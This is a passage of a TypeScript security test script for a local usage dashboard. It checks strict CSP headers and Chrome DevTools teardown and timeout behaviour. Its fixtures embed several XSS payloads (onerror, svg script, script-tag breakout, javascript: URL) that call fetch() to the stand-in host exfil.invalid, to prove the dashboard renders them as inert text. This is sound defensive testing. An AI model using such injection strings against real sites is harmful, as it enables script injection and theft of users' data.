import crypto from "node:crypto";
import { getEventListeners } from "node:events";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync, type ChildProcess } from "node:child_process";
import { fileURLToPath } from "node:url";
import type { AddressInfo } from "node:net";

import ts from "typescript";

import { LocalEventBuffer } from "../packages/collector-cli/src/buffer";
import { collectorConfigSchema } from "../packages/collector-cli/src/config";
import { createCollectorServer } from "../packages/collector-cli/src/server";
import {
  LoaderGenerationGate,
  domTextReadinessExpression,
  receiptIsContentFree,
  waitForDomText,
} from "./fixtures/dashboard-dom-wait";

const scriptPath = fileURLToPath(import.meta.url);
const repoRoot = path.resolve(path.dirname(scriptPath), "..");
const dashboardPath = path.join(repoRoot, "packages/collector-cli/src/dashboard.html");
const chromePath = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome";
const BROWSER_PROTOCOL_CLOSE_MS = 1_000;
const BROWSER_SIGNAL_GRACE_MS = 1_500;
const BROWSER_PROOF_WALL_MS = 30_000;
const CDP_SOCKET_OPEN_MS = 2_000;
const CDP_COMMAND_MS = 5_000;
// What the hosted CI logs measure, and what they do not.
//
// The one failing run (34742541538) reached debugger_target_unavailable
// 4_648 ms into its browser stage. At that revision this step was a single
// fetch that failed fast, so those 4_648 ms are fixture setup plus spawn plus
// waitForFile(DevToolsActivePort) plus one refused /json/list connect — an
// interval waitForFile's own 10_000 ms budget owns. DEBUGGER_TARGET_MS governs
// a different interval, the DevToolsActivePort read to the first answered
// /json/list. So 4_648 ms is a lower bound on the wrong quantity and no number
// here is a hosted readiness measurement.
// The four passing runs finished their whole browser stage — launch, targets,
// CDP, navigation, DOM, teardown — in 34745131093: 6_887 ms,
// 34745679177: 5_056 ms, 34746308701: 10_583 ms, 34746588143: 7_722 ms. Those
// bound the wall clock, not readiness either. None of those logs prints a line
// at Chrome launch or at the first answered /json/list, which is why the
// governed interval has never been observed on a hosted runner.
// Measured locally instead (studio3, Apple silicon, 4 instrumented launches
// with this argv): spawn to DevToolsActivePort 5_301-5_699 ms, DevToolsActive-
// Port to the first answered /json/list 121-128 ms, answered on the first
// attempt every time. That is the governed interval on a host that has never
// reproduced the failure, so it cannot size this deadline either.
// 10_000 ms is therefore a chosen ceiling, not a fit. It strictly dominates the
// 2_000 ms it replaces, exceeds the only hosted datum there is, leaves 100
// retry steps, and still fits the overall wall clock: 10_000 ms plus the
// slowest observed stage (10_583 ms) stays under BROWSER_PROOF_WALL_MS.
// chosenMargin records how the round number was reached; any multiple in
// [2.0439, 2.2590) rounds to the same 10_000 ms, so the equality asserted below
// pins the constant against an accidental edit and is not evidence that the
// deadline was fitted to data.
// browser_debugger_target_readiness_receipt_present_and_numeric prints the
// governed interval from a finally, so a run that expires this deadline prints
// it too, and that rejection carries the same elapsed interval and attempt
// count to the process surface. Until hosted runs have accumulated it, the
// hosted readiness this deadline is meant to cover stays unmeasured.
const DEBUGGER_TARGET_DERIVATION = {
  measuredInterval: "spawn_to_devtools_active_port",
  governedInterval: "devtools_active_port_to_first_answered_json_list",
  hostedReadinessMeasured: false,
  failingRunSpawnToFirstErrorMs: 4_648,
  passingRunBrowserStageMs: {
    34745131093: 6_887,
    34745679177: 5_056,
    34746308701: 10_583,
    34746588143: 7_722,
  },
  chosenMargin: 2.15,
} as const;
const DEBUGGER_TARGET_MS = 10_000;
// The synthetic never-ready checks only need to prove a deadline is enforced,
// so they inject their own. Sizing them from DEBUGGER_TARGET_MS would make
// every run pay the production ceiling for a negative test.
const NEVER_READY_DEADLINE_MS = 1_500;
const DEBUGGER_TARGET_RETRY_MS = 100;
const DASHBOARD_READY_MS = 8_000;
const ABORT_SETTLE_MS = 500;

const payloads = {
  html: `HTML:<img src="https://exfil.invalid/html" onerror="fetch('https://exfil.invalid/html-event')">`,
  svg: `SVG:<svg><script>fetch('https://exfil.invalid/svg')</script><animate onbegin="alert(1)"></animate></svg>`,
  script: `SCRIPT:</script><script>fetch('https://exfil.invalid/script')</script>`,
  event: `EVENT:" autofocus onfocus="fetch('https://exfil.invalid/event')" x="`,
  url: `URL:javascript:fetch('https://exfil.invalid/url')`,
  unicode: `UNICODE:𝕻𝖑𝖎𝖒𝖘𝖔𝖑𝖑 e\u0301 \u202Etxt\u2066 <b>still text</b>`,
} as const;

const snapshotFixture = {
  window: { days: 30 },
  generation: 109,
  projection: {
    status: "ready",
    freshnessAt: "2026-07-17T18:00:00.000Z",
    degraded: false,
  },
  summary: {
    days: 30,
    totals: {
      costUsd: 12.34,
      inputTokens: 1234,
      outputTokens: 234,
      cacheReadTokens: 34,
      cacheCreationTokens: 12,
      sessions: 1,
      sessionsWithTokens: 1,
      events: 3,
    },
    daily: [{ day: "2026-07-17", costUsd: 12.34, tokens: 1468 }],
    byModel: [{ model: payloads.html, calls: 1, inputTokens: 1234, outputTokens: 234, costUsd: 12.34, unpricedCalls: 0 }],
    bySource: [{ source: payloads.svg, sessions: 1, events: 3, costUsd: 12.34 }],
  },
  sessions: [{
    sessionId: `session-${payloads.event}`,
    startedAt: "2026-07-17T17:00:00.000Z",
    source: "codex",
    events: 3,
    inputTokens: 1234,
    outputTokens: 234,
    costUsd: 12.34,
    repoHash: "sha256:securityproofrepo",
    repoLabel: payloads.url,
    repoCount: 2,
  }],
  repos: [{
    repoHash: "sha256:securityproofrepo",
    label: payloads.svg,
    sessions: 1,
    inputTokens: 1234,
    outputTokens: 234,
    costUsd: 12.34,
  }],
  accounts: {
    priorityRepoCount: 1,
    buckets: { priorityUsd: 10, otherUsd: 2, unlinkedUsd: 0.34 },
    accounts: [{
      accountHash: "sha256:securityproofaccount",
      label: payloads.script,
      email: payloads.event,
      machines: [payloads.unicode],
      sessions: 1,
      priorityUsd: 10,
      otherUsd: 2,
      unlinkedUsd: 0.34,
      totalUsd: 12.34,
      subscription: {
        plan: payloads.url,
        usdPerMonth: 20,
        planCostWindow: 20,
        leverage: 1.2,
        byVendor: [{ plans: payloads.html, spendUsd: 12.34, planCostWindow: 10, leverage: 1.2 }],
      },
    }],
  },
  status: {
    retentionDays: 90,
    stats: { count: 3 },
    health: {
      overall: "amber",
      sources: [{
        source: "codex",
        status: "amber",
        reason: payloads.unicode,
        lastEventAt: "2026-07-17T17:59:00.000Z",
        localLastActivityAt: "2026-07-17T17:59:00.000Z",
      }],
    },
  },
};

const sessionFixture = {
  rollup: {
    source: payloads.html,
    startedAt: "2026-07-17T17:00:00.000Z",
    endedAt: "2026-07-17T17:10:00.000Z",
    events: 3,
    tokenEvents: 1,
    inputTokens: 1234,
    outputTokens: 234,
    cacheReadTokens: 34,
    cacheCreationTokens: 12,
    costUsd: 12.34,
  },
  receipts: {
    linkage: [{ repoHash: "sha256:securityproofrepo", branchHash: "sha256:securityproofbranch", headSha: payloads.event, events: 3 }],
    actionMix: [{ actionClass: payloads.svg, n: 3 }],
    eventTypes: [{ eventType: payloads.script, n: 3 }],
    models: [{ model: payloads.url, inputTokens: 1234, outputTokens: 234, costUsd: 12.34 }],
    suppression: { suppressedEvents: 3 },
  },
};

const repoFixture = {
  label: payloads.svg,
  days: 30,
  repoHash: "sha256:securityproofrepo",
  totals: { sessions: 1, events: 3, inputTokens: 1234, outputTokens: 234, costUsd: 12.34 },
  daily: [{ day: "2026-07-17", costUsd: 12.34 }],
  actionMix: [{ actionClass: payloads.html, n: 3 }],
  models: [{ model: payloads.event, inputTokens: 1234, outputTokens: 234, costUsd: 12.34 }],
  branches: [{ branchHash: "sha256:securityproofbranch", sessions: 1, events: 3 }],
};

const settingsFixture = {
  accounts: [
    { accountHash: "sha256:securityproofaccount", label: payloads.script, email: payloads.event },
    { accountHash: "sha256:securityproofcanonical", label: payloads.unicode, email: null },
  ],
  accountAliases: [],
  priorityRepos: [{ url: payloads.url }, { url: `https://exfil.invalid/display-only/${encodeURIComponent(payloads.svg)}` }],
  subscriptions: [{ account: payloads.html, plan: payloads.svg, usdPerMonth: 20, vendor: "other" }],
  detectedIdentities: [{ source: "codex", email: payloads.event, planType: payloads.unicode }],
};

type CheckReceipt = { name: string; passed: boolean; detail: string };
const checks: CheckReceipt[] = [];
function check(name: string, passed: unknown, detail: string) {
  const receipt = { name, passed: Boolean(passed), detail };
  checks.push(receipt);
  console.log(`${receipt.passed ? "PASS" : "FAIL"} ${name} — ${detail}`);
}

function inlineBlock(html: string, tag: "script" | "style") {
  const opening = `<${tag}>`, start = html.indexOf(opening), end = html.indexOf(`</${tag}>`, start + opening.length);
  if (start < 0 || end < 0) throw new Error(`${tag} block missing`);
  return html.slice(start + opening.length, end);
}

function sha256Source(block: string) {
  return `'sha256-${crypto.createHash("sha256").update(block).digest("base64")}'`;
}

function securityHeaders(html: string) {
  return {
    "content-type": "text/html; charset=utf-8",
    "content-security-policy": [
      "default-src 'none'",
      `script-src ${sha256Source(inlineBlock(html, "script"))}`,
      "script-src-attr 'none'",
      `style-src ${sha256Source(inlineBlock(html, "style"))}`,
      "style-src-attr 'none'",
      "connect-src 'self'",
      "base-uri 'none'",
      "form-action 'none'",
      "frame-ancestors 'none'",
      "object-src 'none'",
    ].join("; "),
    "x-content-type-options": "nosniff",
    "x-frame-options": "DENY",
  };
}

async function actualServerHeaderProof() {
  const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), "plimsoll-dashboard-security-headers-"));
  process.env.PLIMSOLL_HOME = tempDir;
  const buffer = new LocalEventBuffer(path.join(tempDir, "ledger.sqlite"));
  const server = createCollectorServer(collectorConfigSchema.parse({}), buffer);
  try {
    await new Promise<void>((resolve, reject) => {
      server.once("error", reject);
      server.listen(0, "127.0.0.1", resolve);
    });
    const port = (server.address() as AddressInfo).port;
    const response = await fetch(`http://127.0.0.1:${port}/`);
    const html = await response.text();
    const csp = response.headers.get("content-security-policy") ?? "";
    const expectedScript = sha256Source(inlineBlock(html, "script"));
    const expectedStyle = sha256Source(inlineBlock(html, "style"));
    check(
      "dashboard_headers_strict_csp",
      response.status === 200 &&
        csp.includes("default-src 'none'") &&
        csp.includes(`script-src ${expectedScript}`) &&
        csp.includes(`style-src ${expectedStyle}`) &&
        csp.includes("script-src-attr 'none'") &&
        csp.includes("style-src-attr 'none'") &&
        csp.includes("connect-src 'self'") &&
        csp.includes("frame-ancestors 'none'") &&
        !csp.includes("'unsafe-inline'") &&
        !csp.includes("'unsafe-eval'") &&
        !csp.includes("https:") &&
        !csp.includes("http:") &&
        !csp.includes(" *"),
      csp,
    );
    check(
      "dashboard_headers_frame_mime_no_cors",
      response.headers.get("x-frame-options") === "DENY" &&
        response.headers.get("x-content-type-options") === "nosniff" &&
        response.headers.get("access-control-allow-origin") === null,
      JSON.stringify({
        frame: response.headers.get("x-frame-options"),
        nosniff: response.headers.get("x-content-type-options"),
        cors: response.headers.get("access-control-allow-origin"),
      }),
    );
  } finally {
    if (server.listening) await new Promise<void>((resolve) => server.close(() => resolve()));
    buffer.close();
    fs.rmSync(tempDir, { recursive: true, force: true });
  }
}

type TimeoutStage =
  | "browser_proof_overall"
  | "cdp_socket_open"
  | "cdp_command"
  | "dashboard_readiness"
  | "debugger_startup"
  | "debugger_target";

export class ProofTimeoutError extends Error {
  constructor(readonly stage: TimeoutStage, detail?: string, readonly elapsedMs?: number, readonly attempts?: number) {
    super(detail ? `proof_timeout:${stage}:${detail}` : `proof_timeout:${stage}`);
    this.name = "ProofTimeoutError";
  }
}

type CdpEvent = Record<string, unknown>;
type SocketListener = (event: Event) => void;
type CdpSocket = {
  readyState: number;
  addEventListener: (type: string, listener: SocketListener, options?: AddEventListenerOptions | boolean) => void;
  removeEventListener: (type: string, listener: SocketListener, options?: EventListenerOptions | boolean) => void;
  send: (data: string) => void;
  close: () => void;
};

type CdpWaiter = {
  resolve: (value: unknown) => void;
  reject: (error: Error) => void;
};

type CdpMethod = "Page.enable" | "Runtime.enable" | "Network.enable" | "Log.enable" |
  "Emulation.setDeviceMetricsOverride" | "Page.navigate" | "Runtime.evaluate" | "Browser.close";

export class CdpClient {
  private nextId = 1;
  private closed = false;
  private readonly pending = new Map<number, CdpWaiter>();
  private readonly handlers = new Map<string, Array<(params: CdpEvent) => void>>();
  private readonly onMessage = (event: Event) => {
    let message: { id?: number; method?: string; params?: CdpEvent; result?: unknown; error?: unknown };
    try {
      message = JSON.parse(String((event as MessageEvent).data)) as typeof message;
    } catch {
      this.failPending(new Error("cdp_protocol_invalid"));
      return;
    }
    if (message.id !== undefined) {
      const waiter = this.pending.get(message.id);
      if (!waiter) return;
      if (message.error) waiter.reject(new Error("cdp_command_rejected"));
      else waiter.resolve(message.result);
      return;
    }
    if (message.method) {
      for (const handler of this.handlers.get(message.method) ?? []) handler(message.params ?? {});
    }
  };
  private readonly onSocketFailure = () => this.failPending(new Error("cdp_socket_closed"));

  private constructor(
    private readonly socket: CdpSocket,
    private readonly defaultSignal?: AbortSignal,
  ) {
    socket.addEventListener("message", this.onMessage);
    socket.addEventListener("error", this.onSocketFailure);
    socket.addEventListener("close", this.onSocketFailure);
  }

  static async connect(
    url: string,
    options: {
      timeoutMs?: number;
      signal?: AbortSignal;
      socketFactory?: (url: string) => CdpSocket;
    } = {},
  ) {
    const timeoutMs = options.timeoutMs ?? CDP_SOCKET_OPEN_MS;
    const socket = (options.socketFactory ?? ((value) => new WebSocket(value) as CdpSocket))(url);
    await new Promise<void>((resolve, reject) => {
      let settled = false;
      const cleanup = () => {
        clearTimeout(timer);
        socket.removeEventListener("open", onOpen);
        socket.removeEventListener("error", onError);
        options.signal?.removeEventListener("abort", onAbort);
      };
      const finish = (error?: Error) => {
        if (settled) return;
        settled = true;
        cleanup();
        if (error) {
          try { socket.close(); } catch { /* best effort for a connecting socket */ }
          reject(error);
        } else {
          resolve();
        }
      };
      const onOpen: SocketListener = () => finish();
      const onError: SocketListener = () => finish(new Error("cdp_socket_open_failed"));
      const onAbort = () => finish(new ProofTimeoutError("browser_proof_overall"));
      const timer = setTimeout(() => finish(new ProofTimeoutError("cdp_socket_open")), timeoutMs);
      socket.addEventListener("open", onOpen, { once: true });
      socket.addEventListener("error", onError, { once: true });
      options.signal?.addEventListener("abort", onAbort, { once: true });
      if (options.signal?.aborted) onAbort();
      else if (socket.readyState === WebSocket.OPEN) finish();
    });
    return new CdpClient(socket, options.signal);
  }

  static fromSocketForProof(socket: CdpSocket, signal?: AbortSignal) {
    return new CdpClient(socket, signal);
  }

  get pendingCount() {
    return this.pending.size;
  }

  on(method: string, handler: (params: CdpEvent) => void) {
    const entries = this.handlers.get(method) ?? [];
    entries.push(handler);
    this.handlers.set(method, entries);
  }

  send<T = Record<string, unknown>>(
    method: CdpMethod,
    params: Record<string, unknown> = {},
    options: { timeoutMs?: number; signal?: AbortSignal | null } = {},
  ) {
    if (this.closed || this.socket.readyState !== WebSocket.OPEN) {
      return Promise.reject<T>(new Error("cdp_socket_not_open"));
    }
    const id = this.nextId++;
    const timeoutMs = options.timeoutMs ?? CDP_COMMAND_MS;
    const signal = options.signal === undefined ? this.defaultSignal : options.signal ?? undefined;
    const startedAt = performance.now();
    return new Promise<T>((resolve, reject) => {
      let settled = false;
      const cleanup = () => {
        clearTimeout(timer);
        signal?.removeEventListener("abort", onAbort);
        this.pending.delete(id);
      };
      const finish = (error: Error | null, value?: unknown) => {
        if (settled) return;
        settled = true;
        cleanup();
        if (error) reject(error);
        else resolve(value as T);
      };
      const onAbort = () => finish(new ProofTimeoutError("browser_proof_overall"));
      const timer = setTimeout(() => finish(new ProofTimeoutError(
        "cdp_command", method, Math.round(performance.now() - startedAt),
      )), timeoutMs);
      this.pending.set(id, {
        resolve: (value) => finish(null, value),
        reject: (error) => finish(error),
      });
      signal?.addEventListener("abort", onAbort, { once: true });
      if (signal?.aborted) {
        onAbort();
        return;
      }
      try {
        this.socket.send(JSON.stringify({ id, method, params }));
      } catch {
        finish(new Error("cdp_send_failed"));
      }
    });
  }

  close() {
    if (this.closed) return;
    this.closed = true;
    this.failPending(new Error("cdp_client_closed"));
    this.handlers.clear();
    this.socket.removeEventListener("message", this.onMessage);
    this.socket.removeEventListener("error", this.onSocketFailure);
    this.socket.removeEventListener("close", this.onSocketFailure);
    try { this.socket.close(); } catch { /* process teardown remains authoritative */ }
  }

  private failPending(error: Error) {
    for (const waiter of [...this.pending.values()]) waiter.reject(error);
  }
}

function childHasExited(child: ChildProcess) {
  return child.exitCode !== null || child.signalCode !== null;
}

async function waitForChildExit(child: ChildProcess, timeoutMs: number) {
  if (childHasExited(child)) return true;
  return new Promise<boolean>((resolve) => {
    let settled = false;
    const finish = (exited: boolean) => {
      if (settled) return;
      settled = true;
      clearTimeout(timeout);
      child.off("exit", onExit);
      resolve(exited);
    };
    const onExit = () => finish(true);
    const timeout = setTimeout(() => finish(childHasExited(child)), timeoutMs);
    child.once("exit", onExit);
    if (childHasExited(child)) finish(true);
  });
}

async function boundedResult<T>(promise: Promise<T>, timeoutMs: number) {
  let timeout: NodeJS.Timeout | undefined;
  const result = await Promise.race([
    promise.then((value) => ({ status: "settled" as const, value })),
    new Promise<{ status: "timed_out" }>((resolve) => {
      timeout = setTimeout(() => resolve({ status: "timed_out" }), timeoutMs);
    }),
  ]);
  if (timeout) clearTimeout(timeout);
  return result;
}

async function shutdownBrowser(
  cdp: CdpClient | undefined,
  chrome: ChildProcess,
  timing = {
    protocolCloseMs: BROWSER_PROTOCOL_CLOSE_MS,
    signalGraceMs: BROWSER_SIGNAL_GRACE_MS,
  },
) {
  const startedAt = Date.now();
  let protocolClose: "not_connected" | "acknowledged" | "rejected" | "timed_out" = "not_connected";
  if (cdp && !childHasExited(chrome)) {
    try {
      await cdp.send("Browser.close", {}, { timeoutMs: timing.protocolCloseMs, signal: null });
      protocolClose = "acknowledged";
    } catch (error) {
      protocolClose = error instanceof ProofTimeoutError ? "timed_out" : "rejected";
    }
  }
  cdp?.close();

  if (await waitForChildExit(chrome, timing.protocolCloseMs)) {
    return { exited: true, protocolClose, escalatedTo: "none" as const, durationMs: Date.now() - startedAt };
  }

  chrome.kill("SIGTERM");
  if (await waitForChildExit(chrome, timing.signalGraceMs)) {
    return { exited: true, protocolClose, escalatedTo: "SIGTERM" as const, durationMs: Date.now() - startedAt };
  }

  chrome.kill("SIGKILL");
  const exited = await waitForChildExit(chrome, timing.signalGraceMs);
  if (!exited) throw new Error(`Chrome did not exit after bounded SIGKILL teardown (pid ${chrome.pid ?? "unknown"})`);
  return { exited: true, protocolClose, escalatedTo: "SIGKILL" as const, durationMs: Date.now() - startedAt };
}

async function proveBoundedSignalEscalation() {
  const child = spawn(process.execPath, [
    "-e",
    "process.on('SIGTERM',()=>{});process.stdout.write('ready\\n');setInterval(()=>{},1000)",
  ], {
    env: { PATH: process.env.PATH ?? "/usr/bin:/bin" },
    stdio: ["ignore", "pipe", "ignore"],
  });
  try {
    await waitForChildReady(child);
    const receipt = await shutdownBrowser(undefined, child, {
      protocolCloseMs: 25,
      signalGraceMs: 100,
    });
    check(
      "browser_teardown_escalates_after_sigterm_resistance",
      receipt.exited && receipt.escalatedTo === "SIGKILL" && receipt.durationMs <= 500,
      JSON.stringify(receipt),
    );
  } finally {
    if (!childHasExited(child)) {
      child.kill("SIGKILL");
      await waitForChildExit(child, 500);
    }
  }
}

export class NeverResolvingSocket implements CdpSocket {
  private readonly listeners = new Map<string, Set<SocketListener>>();
  readyState: number;
  closed = false;
  sends = 0;

  constructor(readyState: number = WebSocket.OPEN) {
    this.readyState = readyState;
  }

  addEventListener(type: string, listener: SocketListener) {
    const entries = this.listeners.get(type) ?? new Set<SocketListener>();
    entries.add(listener);
    this.listeners.set(type, entries);
  }

  removeEventListener(type: string, listener: SocketListener) {
    const entries = this.listeners.get(type);
    entries?.delete(listener);
    if (entries?.size === 0) this.listeners.delete(type);
  }

  send() {
    this.sends += 1;
  }

  close() {
    this.closed = true;
    this.readyState = WebSocket.CLOSED;
  }

  get listenerCount() {
    return [...this.listeners.values()].reduce((total, entries) => total + entries.size, 0);
  }
}

async function closeFixtureServer(server: http.Server) {
  if (!server.listening) return true;
  server.closeAllConnections();
  const result = await boundedResult(
    new Promise<void>((resolve) => server.close(() => resolve())),
    ABORT_SETTLE_MS,
  );
  if (result.status === "timed_out") server.closeAllConnections();
  return result.status === "settled";
}

async function runWithBrowserWatchdog<T>(options: {
  operation: Promise<T>;
  controller: AbortController;
  cleanup: () => Promise<void>;
  timeoutMs: number;
}) {
  let timeout: NodeJS.Timeout | undefined;
  const watchdog = new Promise<never>((_resolve, reject) => {
    timeout = setTimeout(() => {
      options.controller.abort();
      void options.cleanup().catch(() => undefined);
      reject(new ProofTimeoutError("browser_proof_overall"));
    }, options.timeoutMs);
  });
  try {
    return await Promise.race([options.operation, watchdog]);
  } finally {
    if (timeout) clearTimeout(timeout);
  }
}

async function waitForChildReady(child: ChildProcess) {
  await new Promise<void>((resolve, reject) => {
    let settled = false;
    const finish = (error?: Error) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      child.off("error", onError);
      child.stdout?.off("data", onData);
      if (error) reject(error);
      else resolve();
    };
    const onError = () => finish(new Error("fixture_child_failed"));
    const onData = () => finish();
    const timer = setTimeout(() => finish(new Error("fixture_child_not_ready")), 1_000);
    child.once("error", onError);
    child.stdout?.once("data", onData);
  });
}

export async function runNeverResolvingCdpScenario(fixtureRoot?: string) {
  const profile = fs.mkdtempSync(path.join(
    fixtureRoot ?? os.tmpdir(),
    "plimsoll-dashboard-never-cdp-",
  ));
  const privateSentinel = "NEVER_RESOLVING_CDP_PRIVATE_SENTINEL";
  fs.writeFileSync(path.join(profile, "sentinel"), privateSentinel);
  const child = spawn(process.execPath, [
    "-e",
    // Deliberately exceed the 50ms CDP watchdog during fixture startup.
    "process.on('SIGTERM',()=>{});setTimeout(()=>process.stdout.write('ready\\n'),100);setInterval(()=>{},1000)",
  ], {
    env: { PATH: process.env.PATH ?? "/usr/bin:/bin", HOME: profile },
    stdio: ["ignore", "pipe", "ignore"],
  });
  if (fixtureRoot && child.pid) {
    fs.writeFileSync(path.join(fixtureRoot, "child.pid"), `${child.pid}\n`);
  }
  const socket = new NeverResolvingSocket();
  const controller = new AbortController();
  const cdp = CdpClient.fromSocketForProof(socket, controller.signal);
  let cleanupPromise: Promise<void> | undefined;
  let shutdownReceipt: Awaited<ReturnType<typeof shutdownBrowser>> | undefined;
  const cleanup = () => cleanupPromise ??= (async () => {
    controller.abort();
    try {
      shutdownReceipt = await shutdownBrowser(cdp, child, {
        protocolCloseMs: 25,
        signalGraceMs: 100,
      });
    } finally {
      fs.rmSync(profile, { recursive: true, force: true });
    }
  })();

  let timeoutError: unknown;
  // The watchdog must exercise a pending CDP command in a ready, resistant
  // child. Startup has its own unchanged, bounded readiness deadline.
  try { await waitForChildReady(child); }
  catch (error) { await cleanup(); throw error; }
  const operation = (async () => {
    await cdp.send("Runtime.evaluate", {}, { timeoutMs: 1_000 });
  })();
  try {
    await runWithBrowserWatchdog({ operation, controller, cleanup, timeoutMs: 50 });
  } catch (error) {
    timeoutError = error;
  } finally {
    await cleanup();
  }
  const operationSettlement = await boundedResult(operation.then(
    () => "fulfilled" as const,
    () => "rejected" as const,
  ), ABORT_SETTLE_MS);
  return {
    cdp,
    child,
    operationSettlement,
    privateSentinel,
    profile,
    shutdownReceipt,
    socket,
    timeoutError,
  };
}

async function proveNeverResolvingCdpCleanup() {
  const connectingSocket = new NeverResolvingSocket(WebSocket.CONNECTING);
  let connectError: unknown;
  try {
    await CdpClient.connect("ws://proof.invalid", {
      timeoutMs: 25,
      socketFactory: () => connectingSocket,
    });
  } catch (error) {
    connectError = error;
  }
  check(
    "cdp_socket_open_timeout_settles_socket_and_listeners",
    connectError instanceof ProofTimeoutError &&
      connectError.message === "proof_timeout:cdp_socket_open" &&
      connectingSocket.closed &&
      connectingSocket.listenerCount === 0,
    JSON.stringify({
      error: connectError instanceof Error ? connectError.message : "missing",
      socketClosed: connectingSocket.closed,
      listeners: connectingSocket.listenerCount,
    }),
  );

  const commandSocket = new NeverResolvingSocket();
  const commandClient = CdpClient.fromSocketForProof(commandSocket);
  let commandError: unknown;
  try {
    await commandClient.send("Runtime.evaluate", {}, { timeoutMs: 25, signal: null });
  } catch (error) {
    commandError = error;
  } finally {
    commandClient.close();
  }
  check(
    "cdp_command_timeout_settles_timer_pending_map_socket_and_listeners",
    commandError instanceof ProofTimeoutError &&
      commandError.message === "proof_timeout:cdp_command:Runtime.evaluate" &&
      commandClient.pendingCount === 0 &&
      commandSocket.closed &&
      commandSocket.listenerCount === 0,
    JSON.stringify({
      error: commandError instanceof Error ? commandError.message : "missing",
      pendingCommands: commandClient.pendingCount,
      socketClosed: commandSocket.closed,
      listeners: commandSocket.listenerCount,
    }),
  );

  const scenario = await runNeverResolvingCdpScenario();
  check(
    "never_resolving_cdp_outer_watchdog_cleans_process_profile_socket_and_timers",
    scenario.timeoutError instanceof ProofTimeoutError &&
      scenario.timeoutError.message === "proof_timeout:browser_proof_overall" &&
      !scenario.timeoutError.message.includes(scenario.privateSentinel) &&
      scenario.shutdownReceipt?.exited === true &&
      scenario.shutdownReceipt.escalatedTo === "SIGKILL" &&
      childHasExited(scenario.child) &&
      !fs.existsSync(scenario.profile) &&
      scenario.cdp.pendingCount === 0 &&
      scenario.socket.sends === 2 &&
      scenario.socket.closed &&
      scenario.socket.listenerCount === 0 &&
      scenario.operationSettlement.status === "settled" &&
      scenario.operationSettlement.value === "rejected",
    JSON.stringify({
      error: scenario.timeoutError instanceof Error ? scenario.timeoutError.message : "missing",
      shutdownReceipt: scenario.shutdownReceipt,
      processExited: childHasExited(scenario.child),
      profileRemoved: !fs.existsSync(scenario.profile),
      pendingCommands: scenario.cdp.pendingCount,
      commandsSent: scenario.socket.sends,
      socketClosed: scenario.socket.closed,
      socketListeners: scenario.socket.listenerCount,
      operationSettlement: scenario.operationSettlement,
    }),
  );
}

function pidIsLive(pid: number) {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function proveTimeoutExitSurface() {
  const fixtureRoot = fs.mkdtempSync(path.join(os.tmpdir(), "plimsoll-dashboard-timeout-exit-"));
  let fixturePid = 0;
  try {
    const result = spawnSync(
      process.execPath,
      ["--import", path.join(repoRoot, "node_modules", "tsx", "dist", "loader.mjs"), scriptPath],
      {
        encoding: "utf8",
        env: {
          HOME: fixtureRoot,
          PATH: process.env.PATH ?? "/usr/bin:/bin",
          PLIMSOLL_DASHBOARD_TIMEOUT_EXIT_FIXTURE: "1",
          PLIMSOLL_DASHBOARD_TIMEOUT_FIXTURE_ROOT: fixtureRoot,
        },
        killSignal: "SIGKILL",
        timeout: 5_000,
      },
    );
    const pidFile = path.join(fixtureRoot, "child.pid");
    fixturePid = fs.existsSync(pidFile) ? Number(fs.readFileSync(pidFile, "utf8").trim()) : 0;
    const remaining = fs.readdirSync(fixtureRoot).filter((entry) => entry !== "child.pid");
    const expectedError = JSON.stringify({
      proof: "dashboard-security",
      error: "proof_timeout",
      stage: "browser_proof_overall",
    });
    check(
      "timeout_process_exits_nonzero_content_free_and_leaves_no_profile_or_child",
      result.status === 1 &&
        result.signal === null &&
        result.stdout === "" &&
        result.stderr.trim() === expectedError &&
        fixturePid > 0 &&
        !pidIsLive(fixturePid) &&
        remaining.length === 0,
      JSON.stringify({
        status: result.status,
        signal: result.signal,
        stdoutBytes: Buffer.byteLength(result.stdout ?? ""),
        stderr: result.stderr.trim(),
        childExited: fixturePid > 0 && !pidIsLive(fixturePid),
        remainingProfileEntries: remaining,
      }),
    );
  } finally {
    if (fixturePid > 0 && pidIsLive(fixturePid)) {
      try { process.kill(fixturePid, "SIGKILL"); } catch { /* best effort fixture cleanup */ }
    }
    fs.rmSync(fixtureRoot, { recursive: true, force: true });
  }
}

function abortableDelay(ms: number, signal: AbortSignal) {
  return new Promise<void>((resolve, reject) => {
    let settled = false;
    const finish = (error?: Error) => {
      if (settled) return;
      settled = true;
      clearTimeout(timer);
      signal.removeEventListener("abort", onAbort);
      if (error) reject(error);
      else resolve();
    };
    const onAbort = () => finish(new ProofTimeoutError("browser_proof_overall"));
    const timer = setTimeout(() => finish(), ms);
    signal.addEventListener("abort", onAbort, { once: true });
    if (signal.aborted) onAbort();
  });
}

async function waitForFile(file: string, process: ChildProcess, signal: AbortSignal) {
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    if (fs.existsSync(file)) return;
    if (signal.aborted) throw new ProofTimeoutError("browser_proof_overall");
    if (childHasExited(process)) {
      throw new Error("chrome_exited_before_debugger_startup");
    }
    await abortableDelay(25, signal);
  }
  throw new ProofTimeoutError("debugger_startup");
}

// Resolves on the step or as soon as the deadline/outer abort fires, so the
// caller re-checks its own deadline instead of inheriting a delay error.
function debuggerRetryStep(ms: number, signal: AbortSignal) {
  return new Promise<void>((resolve) => {
    const finish = () => {
      clearTimeout(timer);
      signal.removeEventListener("abort", finish);
      resolve();
    };
    const timer = setTimeout(finish, ms);
    signal.addEventListener("abort", finish, { once: true });
    if (signal.aborted) finish();
  });
}

// Chrome answers /json/list with a JSON array of target objects, each carrying
// a type. Anything else — a non-array, or an array of something that is not a
// target — is a body this step cannot interpret, not a readiness state. Only
// type is required: a target that already has a debugger attached is published
// without webSocketDebuggerUrl, and picking the page target handles that.
// A well-shaped array that holds no page target is not a fault either: it is
// what Chrome answers before its first page registers, so the caller treats it
// as not ready rather than as a body it can decide on.
function parseDebuggerTargets(body: string) {
  let parsed: unknown;
  try {
    parsed = JSON.parse(body);
  } catch {
    return undefined;
  }
  if (!Array.isArray(parsed)) return undefined;
  const shaped = parsed.every((entry) =>
    typeof entry === "object" && entry !== null && typeof (entry as { type?: unknown }).type === "string");
  return shaped ? parsed as Array<{ type: string; webSocketDebuggerUrl: string }> : undefined;
}

type DebuggerTargetOptions = {
